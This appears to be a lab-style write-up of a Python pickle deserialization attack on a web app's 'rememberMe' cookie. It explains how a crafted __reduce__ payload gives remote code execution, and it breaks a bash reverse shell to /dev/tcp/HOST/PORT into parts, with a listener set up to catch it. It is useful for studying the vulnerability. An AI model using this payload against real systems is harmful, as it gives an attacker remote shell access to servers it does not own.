# Deserialize
### 1.Detection

After entering the login page, there is a `Remember Me` section to remember your account for the next logins.

![image](https://user-images.githubusercontent.com/63194321/135709238-cf1d62d7-a944-4aad-9485-9ac6a2d098f5.png)

If you log in with the `Remember Me` option, there will be a new value in the cookie named `rememberMe` with the encoded value `base64`

![image](https://user-images.githubusercontent.com/63194321/135709316-adeaa86a-ff81-40c4-b787-76b0405d39aa.png)

Now let's `Logout` the cookie `rememberMe` to keep so that the next time you log in, you don't need to re-enter `username` and `password`.

![image](https://user-images.githubusercontent.com/63194321/135709946-a1842895-fcf1-4f3e-ac22-fd66ffb33ae5.png)

After decoding the `rememberMe` cookie with `base64` we determine that this cookie is a serialized object and will be deserialized or verified each time we log in.

![image](https://user-images.githubusercontent.com/63194321/135710201-c0d77c65-fcc4-405d-95fa-c919d947454e.png)

From <a href=https://docs.python.org/3/library/pickle.html#module-pickle>Document</a>: The `pickle` module implements binary protocols for serializing and de-serializing Python object structures. And it's very vulnerable to RCE implementation

### 2.Exploit

**B1.** After referencing the online documents, this module will cause an error in the `__reduce__` function. So we will rewrite a class that contains this function along with our payload.

![image](https://user-images.githubusercontent.com/63194321/135710760-f0369f8a-5ee6-41a9-9db0-de994968ee01.png)

Payload include:

  `bash -c`: reads and executes `command_string` commands.

  `bash -i`: force shell to run in interactive shells.

  `> & `: redirect to file `/dev/tcp/HOST/PORT`.

  `/dev/tcp/HOST/PORT` opens connection `tcp` to `HOST`:`PORT`

  `0>&1` shows everything to the screen




**B2.** In `terminal` open a listener on `PORT` in payload

![image](https://user-images.githubusercontent.com/63194321/135711643-dadd59f9-a1db-42ff-ad5b-03d264450ca3.png)

**B3.** Run the file created in `B1` to get and replace the cookie `remember Me` and `Log in`

![image](https://user-images.githubusercontent.com/63194321/135712228-f711c7ec-ea9b-4c2c-ba7a-dd51e42a5425.png)

**B4.** Check the listener on `Terminal` at `B2`.

![image](https://user-images.githubusercontent.com/63194321/135712388-2ada8269-6f15-450c-a6d1-ec249906ae25.png)




          
